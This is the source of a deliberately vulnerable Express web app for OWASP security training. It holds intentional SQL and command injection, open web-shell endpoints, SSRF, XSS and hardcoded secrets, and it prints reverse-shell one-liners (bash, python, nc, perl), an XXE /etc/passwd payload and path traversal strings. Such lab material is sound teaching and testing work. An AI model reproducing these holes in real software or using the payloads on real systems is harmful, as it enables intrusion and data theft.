/**
 * ⚠️ VULNERABLE APPLICATION - FOR SECURITY TESTING ONLY ⚠️
 * This app contains INTENTIONAL vulnerabilities for educational purposes.
 * NEVER deploy this in production or expose to the internet!
 */

const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const multer = require('multer');
const { Pool } = require('pg');
const path = require('path');
const fs = require('fs');
const child_process = require('child_process');
const serialize = require('node-serialize');
const _ = require('lodash');
const axios = require('axios');

const exec = child_process.exec;
const execSync = child_process.execSync;

const app = express();
const upload = multer({ dest: 'uploads/' });

app.set('view engine', 'ejs');
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static('public'));

// Database connection
const pool = new Pool({
  connectionString: process.env.DATABASE_URL || 'postgresql://vulnuser:vulnpass@localhost:5432/vulndb'
});

// ==========================================
// HOME PAGE
// ==========================================
app.get('/', (req, res) => {
  res.render('index', { title: 'Vulnerable App' });
});

// ==========================================
// A01:2021 - BROKEN ACCESS CONTROL
// ==========================================
const users = {
  admin: { password: 'admin123', role: 'admin', apiKey: 'sk-admin-secret-key-12345' },
  user: { password: 'user123', role: 'user', apiKey: 'sk-user-key-67890' },
  guest: { password: 'guest123', role: 'guest', apiKey: 'sk-guest-key-11111' }
};

// Insecure login - no rate limiting, weak credentials
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = users[username];

  // VULN: Timing attack possible
  if (user && user.password === password) {
    res.cookie('auth', JSON.stringify({ username, role: user.role }), { httpOnly: false });
    res.cookie('apiKey', user.apiKey);
    res.json({ success: true, message: 'Login successful', apiKey: user.apiKey });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

// IDOR - Insecure Direct Object Reference
app.get('/profile/:id', async (req, res) => {
  const { id } = req.params;

  // VULN: No authorization check, can access any user's data
  try {
    const result = await pool.query('SELECT * FROM users WHERE id = $1', [id]);
    if (result.rows.length > 0) {
      res.render('profile', { user: result.rows[0] });
    } else {
      res.status(404).send('User not found');
    }
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// Broken access control - admin area without proper auth
app.get('/admin', (req, res) => {
  // VULN: Only checks cookie, easily bypassed
  const auth = req.cookies.auth;
  if (auth) {
    const user = JSON.parse(auth);
    // VULN: Trusts client-side cookie data
    if (user.role === 'admin') {
      return res.render('admin', { user });
    }
  }
  res.status(403).send('Access denied');
});

// ==========================================
// A02:2021 - CRYPTOGRAPHIC FAILURES
// ==========================================
app.get('/encrypt', (req, res) => {
  const { data } = req.query;

  // VULN: Using weak base64 "encryption"
  const encrypted = Buffer.from(data || '').toString('base64');

  // VULN: Hardcoded encryption key exposed
  const secretKey = 'my_super_secret_key_12345';

  res.json({
    encrypted,
    secretKey, // VULN: Exposing secret
    algorithm: 'base64' // VULN: Not real encryption
  });
});

// Password stored in plaintext
app.post('/register', async (req, res) => {
  const { username, password, email, ssn, creditCard } = req.body;

  try {
    // VULN: Storing password in plaintext
    await pool.query(
      'INSERT INTO users (username, password, email, ssn, credit_card) VALUES ($1, $2, $3, $4, $5)',
      [username, password, email, ssn, creditCard]
    );

    // VULN: Returning sensitive data in response
    res.json({
      success: true,
      user: { username, password, email, ssn, creditCard }
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// A03:2021 - INJECTION
// ==========================================

// SQL Injection - Classic
app.get('/users', async (req, res) => {
  const { name } = req.query;

  try {
    // VULN: Direct string concatenation - SQL Injection
    const query = `SELECT * FROM users WHERE username LIKE '%${name}%'`;
    const result = await pool.query(query);
    res.json(result.rows);
  } catch (err) {
    // VULN: Detailed error exposure
    res.status(500).json({ error: err.message, query: err.query });
  }
});

// SQL Injection - Login bypass
app.post('/auth', async (req, res) => {
  const { username, password } = req.body;

  try {
    // VULN: SQL Injection in authentication
    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
    const result = await pool.query(query);

    if (result.rows.length > 0) {
      res.json({ success: true, user: result.rows[0] });
    } else {
      res.status(401).json({ success: false });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Command Injection - Ping
app.get('/ping', (req, res) => {
  const { host } = req.query;

  if (!host) {
    return res.status(400).json({ error: 'Host parameter required' });
  }

  // VULN: Command Injection
  exec(`ping -c 1 ${host}`, (error, stdout, stderr) => {
    res.json({
      host,
      output: stdout,
      error: stderr,
      command: `ping -c 1 ${host}` // VULN: Exposing command
    });
  });
});

// Command Injection - DNS Lookup
app.get('/dns', (req, res) => {
  const { domain } = req.query;

  // VULN: Command Injection with multiple vectors
  const command = `nslookup ${domain}`;
  try {
    const output = execSync(command).toString();
    res.render('dns', { domain, output, command });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Command Injection - File operations
app.get('/file', (req, res) => {
  const { filename } = req.query;

  // VULN: Command Injection via filename
  exec(`cat ${filename}`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: stderr });
    }
    res.send(`<pre>${stdout}</pre>`);
  });
});

// NoSQL Injection (simulated with PostgreSQL JSON)
app.post('/search', async (req, res) => {
  const { criteria } = req.body;

  try {
    // VULN: Injection via JSON criteria
    const query = `SELECT * FROM products WHERE data @> '${JSON.stringify(criteria)}'`;
    const result = await pool.query(query);
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// LDAP Injection (simulated)
app.get('/ldap', (req, res) => {
  const { username } = req.query;

  // VULN: LDAP Injection pattern (simulated)
  const filter = `(uid=${username})`;

  res.json({
    message: 'LDAP query constructed',
    filter,
    vulnerable: true,
    example: 'Try: *)(uid=*))(|(uid=*'
  });
});

// XPath Injection (simulated)
app.get('/xpath', (req, res) => {
  const { name } = req.query;

  // VULN: XPath Injection
  const xpath = `//user[name='${name}']`;

  res.json({
    xpath,
    message: 'XPath query constructed',
    bypass: "Try: ' or '1'='1"
  });
});

// ==========================================
// A04:2021 - INSECURE DESIGN
// ==========================================

// Password reset with predictable tokens
app.post('/reset-password', async (req, res) => {
  const { email } = req.body;

  // VULN: Predictable reset token
  const token = Date.now().toString(36); // Very predictable

  try {
    await pool.query('UPDATE users SET reset_token = $1 WHERE email = $2', [token, email]);
    res.json({
      message: 'Reset email sent',
      token, // VULN: Exposing token
      expiresIn: '24 hours'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Weak security questions
app.get('/security-questions', async (req, res) => {
  const { email } = req.query;

  try {
    const result = await pool.query('SELECT security_question FROM users WHERE email = $1', [email]);
    res.json({
      email,
      question: result.rows[0]?.security_question || 'No question found'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Rate limiting bypass
app.post('/verify-code', (req, res) => {
  const { code } = req.body;

  // VULN: No rate limiting on verification
  const correctCode = '123456';

  if (code === correctCode) {
    res.json({ success: true, message: 'Code verified!' });
  } else {
    res.json({ success: false, message: 'Invalid code' });
  }
});

// ==========================================
// A05:2021 - SECURITY MISCONFIGURATION
// ==========================================

// Exposed configuration
app.get('/config', (req, res) => {
  // VULN: Exposing full configuration
  res.json({
    env: process.env,
    database: {
      url: process.env.DATABASE_URL,
      host: 'postgres',
      port: 5432,
      user: 'vulnuser',
      password: 'vulnpass'
    },
    secrets: {
      apiKey: 'sk-live-1234567890abcdef',
      jwtSecret: 'super-secret-jwt-key',
      encryptionKey: 'aes-256-key-1234567890123456'
    },
    debug: true,
    version: '1.0.0'
  });
});

// Stack traces enabled
app.get('/error', (req, res) => {
  // VULN: Detailed error messages
  throw new Error('This is a test error with full stack trace');
});

// Directory listing
app.get('/files', (req, res) => {
  const dir = req.query.dir || './';

  try {
    // VULN: Path traversal possible
    const files = fs.readdirSync(dir);
    res.json({
      directory: dir,
      files: files.map(f => ({
        name: f,
        path: path.join(dir, f)
      }))
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Default credentials check
app.get('/defaults', (req, res) => {
  res.json({
    message: 'Default credentials',
    credentials: [
      { service: 'admin', username: 'admin', password: 'admin' },
      { service: 'database', username: 'root', password: 'root' },
      { service: 'ftp', username: 'anonymous', password: 'anonymous' }
    ]
  });
});

// ==========================================
// A06:2021 - VULNERABLE COMPONENTS
// ==========================================

// Using vulnerable lodash prototype pollution
app.post('/merge', (req, res) => {
  const { target, source } = req.body;

  // VULN: Prototype pollution via lodash merge
  const result = _.merge({}, target, source);

  res.json({ merged: result });
});

// Insecure deserialization
app.post('/deserialize', (req, res) => {
  const { data } = req.body;

  try {
    // VULN: Insecure deserialization
    const obj = serialize.unserialize(data);
    res.json({ result: obj });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// SSRF - Server Side Request Forgery
app.get('/fetch', async (req, res) => {
  const { url } = req.query;

  if (!url) {
    return res.status(400).json({ error: 'URL required' });
  }

  try {
    // VULN: SSRF - No URL validation
    const response = await axios.get(url, { timeout: 5000 });
    res.json({
      url,
      status: response.status,
      data: response.data
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// SSRF - Internal network access
app.get('/proxy', async (req, res) => {
  const { target } = req.query;

  // VULN: Can access internal services
  const internalUrls = [
    'http://localhost:5432',
    'http://postgres:5432',
    'http://127.0.0.1:3000',
    'http://169.254.169.254' // AWS metadata
  ];

  try {
    const response = await axios.get(target);
    res.send(response.data);
  } catch (err) {
    res.status(500).json({
      error: err.message,
      hint: 'Try accessing internal services',
      examples: internalUrls
    });
  }
});

// ==========================================
// A07:2021 - AUTH FAILURES
// ==========================================

// Session fixation
app.get('/session', (req, res) => {
  // VULN: Accepting session ID from query
  const sessionId = req.query.sessionId || Math.random().toString(36);

  res.cookie('sessionId', sessionId);
  res.json({ sessionId, message: 'Session set' });
});

// Brute force vulnerable
app.post('/brute', (req, res) => {
  const { code } = req.body;
  const correctCode = '1234';

  // VULN: No rate limiting
  if (code === correctCode) {
    res.json({ success: true, flag: 'FLAG{brute_force_success}' });
  } else {
    res.status(401).json({ success: false });
  }
});

// Weak password policy
app.post('/change-password', async (req, res) => {
  const { username, newPassword } = req.body;

  // VULN: No password complexity requirements
  if (newPassword.length < 1) {
    return res.status(400).json({ error: 'Password too short' });
  }

  try {
    await pool.query('UPDATE users SET password = $1 WHERE username = $2', [newPassword, username]);
    res.json({ success: true, message: 'Password changed' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// A08:2021 - SOFTWARE INTEGRITY FAILURES
// ==========================================

// Insecure download
app.get('/download', (req, res) => {
  const { file } = req.query;

  // VULN: No integrity check, path traversal
  const filePath = path.join(__dirname, 'downloads', file);

  res.download(filePath, (err) => {
    if (err) {
      res.status(500).json({ error: 'Download failed', path: filePath });
    }
  });
});

// CI/CD simulation - insecure pipeline
app.get('/deploy', (req, res) => {
  // VULN: Simulated insecure deployment
  res.json({
    message: 'Deployment triggered',
    vulnerabilities: [
      'No code signing verification',
      'Dependencies from untrusted sources',
      'No integrity checks',
      'Auto-deploy on any commit'
    ],
    config: {
      branch: 'main',
      autoDeploy: true,
      verifySignatures: false
    }
  });
});

// ==========================================
// A09:2021 - LOGGING FAILURES
// ==========================================

// Log injection
app.post('/log', (req, res) => {
  const { message } = req.body;

  // VULN: Log injection
  const logEntry = `[${new Date().toISOString()}] User action: ${message}`;
  fs.appendFileSync('app.log', logEntry + '\n');

  res.json({ logged: true, entry: logEntry });
});

// Sensitive data in logs
app.get('/debug-logs', (req, res) => {
  // VULN: Exposing sensitive logs
  const logs = [
    { timestamp: '2024-01-01', level: 'INFO', message: 'User login: admin' },
    { timestamp: '2024-01-01', level: 'DEBUG', message: 'Password attempt: admin123' },
    { timestamp: '2024-01-01', level: 'INFO', message: 'API Key used: sk-live-12345' },
    { timestamp: '2024-01-01', level: 'ERROR', message: 'Credit card: 4111-1111-1111-1111' }
  ];

  res.json({ logs });
});

// No monitoring
app.get('/audit', (req, res) => {
  res.json({
    monitoring: false,
    alerting: false,
    logging: 'local-only',
    retention: '1 day',
    vulnerabilities: [
      'No failed login monitoring',
      'No anomaly detection',
      'No real-time alerts',
      'Logs can be deleted'
    ]
  });
});

// ==========================================
// A10:2021 - SSRF
// ==========================================

// Webhook SSRF
app.post('/webhook', async (req, res) => {
  const { callbackUrl } = req.body;

  try {
    // VULN: SSRF via webhook
    await axios.post(callbackUrl, {
      event: 'test',
      timestamp: Date.now()
    });
    res.json({ success: true, message: 'Webhook sent' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PDF generator SSRF
app.get('/pdf', async (req, res) => {
  const { url } = req.query;

  // VULN: SSRF via PDF generation
  res.json({
    message: 'PDF generation would fetch:',
    url,
    vulnerable: true,
    internalAccess: ['http://localhost:*', 'http://127.0.0.1:*', 'http://169.254.169.254']
  });
});

// ==========================================
// XSS - CROSS-SITE SCRIPTING
// ==========================================

// Reflected XSS
app.get('/search-xss', (req, res) => {
  const { q } = req.query;

  // VULN: Direct reflection without encoding
  res.send(`
    <h1>Search Results</h1>
    <p>You searched for: ${q}</p>
    <p>Try: &lt;script&gt;alert('XSS')&lt;/script&gt;</p>
  `);
});

// Stored XSS
app.post('/comments', async (req, res) => {
  const { author, content } = req.body;

  try {
    // VULN: Storing XSS payloads
    await pool.query(
      'INSERT INTO comments (author, content) VALUES ($1, $2) RETURNING *',
      [author, content]
    );
    res.json({ success: true, author, content });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/comments', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM comments ORDER BY id DESC');
    // VULN: Rendering without sanitization
    res.render('comments', { comments: result.rows });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DOM XSS
app.get('/dom-xss', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>DOM XSS Demo</title></head>
    <body>
      <h1>DOM XSS Vulnerability</h1>
      <div id="output"></div>
      <script>
        // VULN: Direct use of location.hash
        document.getElementById('output').innerHTML = decodeURIComponent(location.hash.slice(1));
      </script>
      <p>Try: #<img src=x onerror=alert('XSS')></p>
    </body>
    </html>
  `);
});

// ==========================================
// FILE UPLOAD VULNERABILITIES
// ==========================================

app.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  // VULN: No file type validation
  // VULN: Predictable filename
  // VULN: Files accessible via web
  res.json({
    message: 'File uploaded',
    filename: req.file.filename,
    originalName: req.file.originalname,
    path: `/uploads/${req.file.filename}`,
    size: req.file.size,
    mimetype: req.file.mimetype
  });
});

app.get('/uploads/:filename', (req, res) => {
  const { filename } = req.params;

  // VULN: Path traversal in file access
  const filepath = path.join(__dirname, 'uploads', filename);

  res.sendFile(filepath, (err) => {
    if (err) {
      res.status(404).json({ error: 'File not found' });
    }
  });
});

// ==========================================
// XXE - XML EXTERNAL ENTITY
// ==========================================

app.post('/xml', (req, res) => {
  const xml = req.body;

  // VULN: XXE simulation
  res.json({
    message: 'XML would be parsed with external entities enabled',
    vulnerable: true,
    payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`
  });
});

// ==========================================
// PATH TRAVERSAL
// ==========================================

app.get('/read-file', (req, res) => {
  const { file } = req.query;

  // VULN: Path traversal
  const filepath = path.join(__dirname, 'public', file);

  fs.readFile(filepath, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).json({
        error: err.message,
        hint: 'Try: ../../../../etc/passwd or ../../../app/server.js'
      });
    }
    res.send(data);
  });
});

// ==========================================
// OPEN REDIRECT
// ==========================================

app.get('/redirect', (req, res) => {
  const { url } = req.query;

  // VULN: Open redirect
  res.redirect(url);
});

app.get('/login-redirect', (req, res) => {
  const { next } = req.query;

  // VULN: Open redirect via 'next' parameter
  res.render('login-redirect', { next: next || '/home' });
});

// ==========================================
// REVERSE SHELL ENDPOINTS
// ==========================================

app.get('/shell', (req, res) => {
  const { ip, port } = req.query;

  // VULN: Reverse shell via command injection
  const payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;

  res.json({
    message: 'Reverse shell command',
    payload,
    command: `eval "${payload}"`,
    warning: 'EXTREMELY DANGEROUS - For authorized testing only'
  });
});

app.get('/reverse-shell', (req, res) => {
  const { listener } = req.query;

  // VULN: Another reverse shell vector
  res.json({
    payloads: [
      { type: 'bash', cmd: `bash -c 'bash -i >& /dev/tcp/${listener} 0>&1'` },
      { type: 'python', cmd: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${listener}".split(":")[0],int("${listener}".split(":")[1])));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
      { type: 'nc', cmd: `nc -e /bin/sh ${listener}` },
      { type: 'perl', cmd: `perl -e 'use Socket;$i="${listener}";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(${listener}.split(":")[1],inet_aton(${listener}.split(":")[0])))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` }
    ],
    vulnerable: true
  });
});

// ==========================================
// API VULNERABILITIES
// ==========================================

// Mass assignment
app.put('/users/:id', async (req, res) => {
  const { id } = req.params;
  const updates = req.body;

  // VULN: Mass assignment - allows updating any field
  const setClause = Object.keys(updates)
    .map((key, i) => `${key} = $${i + 2}`)
    .join(', ');

  try {
    const query = `UPDATE users SET ${setClause} WHERE id = $1`;
    await pool.query(query, [id, ...Object.values(updates)]);
    res.json({ success: true, updated: updates });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// No rate limiting on API
app.get('/api/v1/users', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM users');
    // VULN: Returning all user data including passwords
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GraphQL-like injection simulation
app.post('/graphql', async (req, res) => {
  const { query } = req.body;

  // VULN: Query injection simulation
  res.json({
    message: 'GraphQL query would execute',
    query,
    vulnerabilities: ['Introspection enabled', 'No query depth limit', 'No rate limiting']
  });
});

// ==========================================
// WEB SHELL
// ==========================================

app.post('/webshell', (req, res) => {
  const { cmd } = req.body;

  // VULN: Web shell functionality
  exec(cmd, (error, stdout, stderr) => {
    res.json({
      command: cmd,
      stdout: stdout || null,
      stderr: stderr || null,
      error: error ? error.message : null
    });
  });
});

app.get('/cmd', (req, res) => {
  const { exec: cmd } = req.query;

  // VULN: GET-based command execution
  try {
    const output = execSync(cmd).toString();
    res.send(`<pre>${output}</pre>`);
  } catch (err) {
    res.status(500).send(`<pre>Error: ${err.message}</pre>`);
  }
});

// ==========================================
// CORS MISCONFIGURATION
// ==========================================

app.get('/api/data', (req, res) => {
  // VULN: Reflecting Origin header
  const origin = req.headers.origin;
  res.header('Access-Control-Allow-Origin', origin);
  res.header('Access-Control-Allow-Credentials', 'true');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', '*');

  res.json({
    sensitive: 'This data should be protected',
    user: 'admin',
    secrets: ['key1', 'key2', 'key3']
  });
});

// ==========================================
// JWT VULNERABILITIES
// ==========================================

app.get('/jwt', (req, res) => {
  const { user } = req.query;

  // VULN: Weak JWT implementation
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64');
  const payload = Buffer.from(JSON.stringify({
    user: user || 'guest',
    role: 'admin',
    exp: Date.now() + 3600000
  })).toString('base64');

  res.json({
    token: `${header}.${payload}.`,
    algorithm: 'none',
    vulnerabilities: [
      'Accepts alg: none',
      'No signature verification',
      'Weak secret if signed',
      'No token expiration check'
    ]
  });
});

// ==========================================
// DEBUG ENDPOINTS
// ==========================================

app.get('/debug', (req, res) => {
  res.json({
    env: process.env,
    cwd: process.cwd(),
    platform: process.platform,
    nodeVersion: process.version,
    memoryUsage: process.memoryUsage(),
    uptime: process.uptime(),
    pid: process.pid
  });
});

app.get('/source', (req, res) => {
  // VULN: Source code disclosure
  fs.readFile(__filename, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.type('text/plain').send(data);
  });
});

// ==========================================
// VULNERABILITY SUMMARY
// ==========================================

app.get('/vulns', (req, res) => {
  res.json({
    title: 'Vulnerable OWASP App - Vulnerability List',
    categories: {
      'A01:2021 - Broken Access Control': [
        'GET /profile/:id - IDOR',
        'POST /login - Weak authentication',
        'GET /admin - Cookie-based auth bypass'
      ],
      'A02:2021 - Cryptographic Failures': [
        'GET /encrypt - Weak encryption',
        'POST /register - Plaintext passwords',
        'GET /config - Exposed secrets'
      ],
      'A03:2021 - Injection': [
        'GET /users - SQL Injection',
        'POST /auth - SQL Injection login bypass',
        'GET /ping - Command Injection',
        'GET /dns - Command Injection',
        'GET /file - Command Injection',
        'POST /search - NoSQL Injection',
        'GET /ldap - LDAP Injection',
        'GET /xpath - XPath Injection'
      ],
      'A04:2021 - Insecure Design': [
        'POST /reset-password - Predictable tokens',
        'GET /security-questions - Weak questions',
        'POST /verify-code - No rate limiting'
      ],
      'A05:2021 - Security Misconfiguration': [
        'GET /config - Exposed configuration',
        'GET /error - Stack traces',
        'GET /files - Directory listing',
        'GET /defaults - Default credentials'
      ],
      'A06:2021 - Vulnerable Components': [
        'POST /merge - Prototype pollution',
        'POST /deserialize - Insecure deserialization',
        'GET /fetch - SSRF',
        'GET /proxy - Internal SSRF'
      ],
      'A07:2021 - Auth Failures': [
        'GET /session - Session fixation',
        'POST /brute - Brute force vulnerable',
        'POST /change-password - Weak policy'
      ],
      'A08:2021 - Integrity Failures': [
        'GET /download - Path traversal, no integrity',
        'GET /deploy - Insecure CI/CD'
      ],
      'A09:2021 - Logging Failures': [
        'POST /log - Log injection',
        'GET /debug-logs - Sensitive data in logs',
        'GET /audit - No monitoring'
      ],
      'A10:2021 - SSRF': [
        'POST /webhook - SSRF via webhook',
        'GET /pdf - SSRF via PDF generation'
      ],
      'XSS': [
        'GET /search-xss - Reflected XSS',
        'POST /comments - Stored XSS',
        'GET /comments - XSS rendering',
        'GET /dom-xss - DOM XSS'
      ],
      'File Upload': [
        'POST /upload - No validation',
        'GET /uploads/:filename - Path traversal'
      ],
      'XXE': [
        'POST /xml - XML External Entity'
      ],
      'Path Traversal': [
        'GET /read-file - Directory traversal'
      ],
      'Open Redirect': [
        'GET /redirect - Open redirect',
        'GET /login-redirect - Open redirect via next'
      ],
      'Reverse Shell': [
        'GET /shell - Reverse shell commands',
        'GET /reverse-shell - Multiple payloads',
        'POST /webshell - Web shell',
        'GET /cmd - Command execution'
      ],
      'API': [
        'PUT /users/:id - Mass assignment',
        'GET /api/v1/users - Overly permissive',
        'POST /graphql - Query injection'
      ],
      'CORS': [
        'GET /api/data - CORS misconfiguration'
      ],
      'JWT': [
        'GET /jwt - Weak JWT (alg: none)'
      ],
      'Debug': [
        'GET /debug - System info leak',
        'GET /source - Source code disclosure'
      ]
    }
  });
});

// Error handler with stack traces
app.use((err, req, res, next) => {
  // VULN: Detailed error exposure
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
    body: req.body,
    query: req.query,
    headers: req.headers
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`⚠️  VULNERABLE APP running on port ${PORT}`);
  console.log('🔒 This application contains INTENTIONAL vulnerabilities');
  console.log('📚 For security testing and education ONLY');
});
